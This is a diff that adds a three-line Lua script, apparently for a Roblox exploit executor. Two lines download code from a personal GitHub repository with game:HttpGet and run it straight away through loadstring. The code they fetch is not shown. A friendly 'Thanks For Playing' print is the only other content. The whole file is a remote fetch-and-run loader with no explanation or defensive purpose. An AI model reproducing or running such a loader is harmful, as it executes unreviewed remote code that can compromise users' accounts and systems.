@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Idk/refs/heads/main/Execute%20Tracker%20Info"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Idk/refs/heads/main/Kitty%20For%20Service"))()
+print("Thanks For Playing ^_^")
